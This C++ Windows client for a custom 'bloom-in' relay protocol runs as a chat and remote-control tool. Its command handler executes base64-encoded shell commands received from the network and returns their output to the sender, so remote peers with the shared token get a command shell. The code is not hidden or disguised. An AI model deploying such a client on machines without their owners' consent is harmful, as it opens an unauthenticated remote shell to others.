#include <iostream>
#include <thread>
#include <winsock.h>
#include <Windows.h>
#include <string>
#include <fstream>
#include <ctime>
#include <map>
#include ".\libs\string++.h"
#include ".\libs\b64++.h"
#include ".\libs\execute.h"
#include ".\libs\file++.h"

#define CONFIG_FILE "./config.config"
#pragma comment(lib, "ws2_32.lib")
using namespace std;

bool debug_state = false;

struct config
{
    string IP;
    int port;
    string protocol_version;
    string token;
    string id;
    config(string fp = CONFIG_FILE)
    {
        fstream file;
        file.open(fp, ios::in);
        string buffer;
        int line = 0;
        while (getline(file, buffer))
        {
            line++;
            if (NULL != strstr(buffer.c_str(), "IP"))
            {
                this->IP = strtok((char *)buffer.c_str(), "IP ");
                continue;
            }

            if (NULL != strstr(buffer.c_str(), "port"))
            {
                this->port = stoi(strtok((char *)buffer.c_str(), "port "));
                continue;
            }

            if (NULL != strstr(buffer.c_str(), "protocol_version"))
            {
                this->protocol_version = strtok((char *)buffer.c_str(), "protocol_version ");
                continue;
            }

            if (NULL != strstr(buffer.c_str(), "token"))
            {
                this->token = strtok((char *)buffer.c_str(), "token ");
                continue;
            }

            if (NULL != strstr(buffer.c_str(), "id"))
            {
                this->id = strtok((char *)buffer.c_str(), "id ");
                continue;
            }

            if (!buffer.empty())
            {
                printf("UNKNOWN KEY-VALUE: ");
                printf(buffer.c_str());
                printf(" at line :");
                printf("%d", line);
                printf("\n");
            }
        }
    }
};

class blooming_connection
{
    string head;
    string exit;

    string local_id;
    string channel;

    char recv_buffer[65535];
    char send_buffer[65535];

    bool sock_statu = 1;

    thread thread_recv;
    thread thread_send;
    SOCKET sock;
    SOCKADDR_IN socket_config;
    WSADATA wsaData;

    void blooming_init()
    {
        send(sock, head.c_str(), text_size(head.c_str()), 0);
    }

    void blooming_command_formator()
    {
        string user_input_buffer;
        char command_type;
        string command_type_identifer = "p";
        string command_target;
        string command_content;
        string formated_command;
        string result = "";

        getline(cin, user_input_buffer);

        if (is_sub(user_input_buffer, (char *)"exit"))
        {
            blooming_end();
            sock_statu = 0;
            std::exit(-1);
        }

        if (is_sub(user_input_buffer, (char *)"clear"))
        {
            system("CLS");
            return;
        }

        str_vec splited_input_buffer = str_split_space(user_input_buffer, 2);
        if (1 == splited_input_buffer.size())
        {
            command_type = 'h';
        }
        else
        {
            try
            {
                command_type = user_input_buffer[0];
                command_target = splited_input_buffer[1];
                command_content = splited_input_buffer[2];
            }
            catch (...)
            {
                printf("syntax error\n");
            }
        }

        if (debug_state)
        {
            printf("command type: %c\n", command_type);
            printf("command target: %s\n", command_target.c_str());
            printf("command no target: %d\n", (command_target == ""));
            printf("command content: %s\n", command_content.c_str());
        }

        switch (command_type)
        {
        case 'h':
        {

            printf("\033[40;34mhelp\033[0m:\n\n"
                   "\033[40;34msyntax\033[0m:\t<command type> <target id> <command content>...\n"
                   "\033[40;34mcommand types\033[0m: e f d p h\n"
                   "\033[40;34mtarget id\033[0m: target machine's id\n"
                   "\033[40;34mcommand contents\033[0m: e:\'shell commmand\' f:\'local file path\' d:\'remote file path\' p:\'text\' h: NONE\n"
                   "\033[40;34mexample\033[0m:p test_machine hello world\n");
            break;
        }
        case 'e':
            command_type_identifer = "e";
            break;
        case 'f':
        {
            // TODO: figure out how to splite file in to chunks and send them.
            file_chunks file_chunk_b64_buffer;
            file_chunk_b64_buffer = file_b64_encode((char *)command_content.c_str());
            if (file_chunk_b64_buffer[0] == "TGx3eGRHVnpkQzV3Ym1jPQ==")
            {
                printf("Invaild file path\n");
                break;
            }

            for (int i = 0; i < file_chunk_b64_buffer.size(); i++)
            {
                cout << file_chunk_b64_buffer[i] << endl;
            }
            command_type = 'h';

            break;
        }
        case 'd':
        {
            command_type_identifer = "d";
            break;
        }
        default:
        {
            command_type_identifer = "p";
            break;
        }
        }
        if (command_type != 'h')
        {
            result = "bloom-in " + command_type_identifer + " <no>-1<no><channel>" + channel + "<channel><id>" + local_id + "<id>" + "<target>" + command_target + "<target>" + "<data>" + b64_en((char *)command_content.c_str()) + "<data>BLOOM_IN";
            send(sock, result.c_str(), text_size(result.c_str()), 0);
        }
    }

    void blooming_command_analysiser(string recv_buffer)
    {
        char command_type;
        string command_content;

        command_type = recv_buffer[9];

        time_t now = time(0);
        string str_now = ctime(&now);

        string __channel = tag_extractor(recv_buffer, "<channel>");
        string __id = tag_extractor(recv_buffer, "<id>");
        string __target = tag_extractor(recv_buffer, "<target>");
        string __data = tag_extractor(recv_buffer, "<data>");

        switch (command_type)
        {
        case 'd':
        {
            printf("dl\n");
            break;
        }
        case 'e':
        {
            vector<string> __execution_result_list;
            string __execution_result = __execute(b64_de(__data));

            for (int i = 0; i < text_size(__execution_result); i = i + 1024)
            {
                __execution_result_list.push_back(__execution_result.substr(i, 1024));
            }

            int package_counter = 0;

            for (int i = 0; i < __execution_result_list.size(); i++)
            {
                if (i == __execution_result.size())
                {
                    package_counter = -1;
                }

                string result = "bloom-in p <no>" + to_string(package_counter) + "<no><channel>" + __channel + "<channel><id>" + local_id + "<id>" + "<target>" + __id + "<target>" + "<data>" + b64_en((char *)__execution_result_list[i].c_str()) + "<data>BLOOM_IN";
                send(sock, result.c_str(), text_size(result.c_str()), 0);
                package_counter++;
                Sleep(100);
            }

            printf("--------------------\n");
            printf("@%s\t%s executes:\n", str_now.c_str(), __id.c_str());
            printf("\t\t%s\n", b64_de(__data).c_str());
            printf("--------------------\n");
            break;
        }
        case 'p':
        {
            printf("--------------------\n");
            printf("@%s\t%s says:\n", str_now.c_str(), __id.c_str());
            printf("\t\t%s\n", b64_de(__data).c_str());
            printf("--------------------\n");
            break;
        }
        case 'f':
        {
            printf("file stream");
            break;
        }
        default:
        {
            printf("unknown\n");
        }
        }
    }

    void sock_send()
    {
        string buffer;
        string command;
        while (true)
        {
            blooming_command_formator();
        }
    }

    void sock_recv()
    {
        char last_package[65535] = "";
        while (true)
        {
            recv(sock, recv_buffer, 65535, 0);

            if (NULL != strstr(recv_buffer, "invaild syntax") || NULL != strstr(recv_buffer, "close") || 0 == sock_statu || (0 == strcmp(last_package, recv_buffer)))
            {
                if (debug_state)
                {
                    printf("%s %d %s", "close by remote server: ", (0 == strcmp(recv_buffer, "close")), "\n");
                    cout << "close by local exit command: " << (0 == sock_statu) << endl;
                    if (0 == sock_statu)
                    {
                        cout << "close because the server didn't response for some reasons or currently under attack: 0" << endl;
                    }
                    else
                    {
                        cout << "close because the server didn't response for some reasons or currently under attack: " << (0 == strcmp(last_package, recv_buffer)) << endl;
                    }
                }

                blooming_end();
                sock_statu = 0;
                printf("connection closed\n");
                std::exit(-1);
            }

            if (0 != strcmp(recv_buffer, "\0"))
            {
                strcpy(last_package, recv_buffer);
                blooming_command_analysiser(string(recv_buffer));
            }
        }
    }

    void blooming_end()
    {
        send(sock, exit.c_str(), text_size(exit.c_str()), 0);
        closesocket(sock);
        WSACleanup();
    }

public:
    blooming_connection(config config)
    {
        local_id = config.id;
        channel = config.token;

        head = "bloom-in protocol " + config.protocol_version + " <channel>" + config.token + "<channel> <id>" + config.id + "<id> BLOOM_IN";
        exit = "bloom-in exit " + config.protocol_version + " <exit><id>" + config.id + "<id><exit> BLOOM_IN";

        WSAStartup(MAKEWORD(2, 2), &wsaData);
        sock = socket(AF_INET, SOCK_STREAM, 0);
        memset(&socket_config, 0, sizeof(socket_config));
        socket_config.sin_family = AF_INET;
        socket_config.sin_addr.s_addr = inet_addr(config.IP.c_str());
        socket_config.sin_port = htons(config.port);

        connect(sock, (SOCKADDR *)&socket_config, sizeof(SOCKADDR));
        blooming_init();

        thread_recv = thread(&blooming_connection::sock_recv, this);
        thread_send = thread(&blooming_connection::sock_send, this);
        thread_recv.join();
        thread_send.join();
    }
};

int main(int argc, char **argv)
{

    config config;
    if (2 == argc && (0 == strcmp(argv[1], "--debug") || 0 == strcmp(argv[1], "-d")))
    {
        cout << config.token + " " + config.id + " " + config.IP + " " + config.protocol_version << " " << config.port
             << endl;
        debug_state = true;
    }

    blooming_connection *sock = new blooming_connection(config);
    return 0;
}
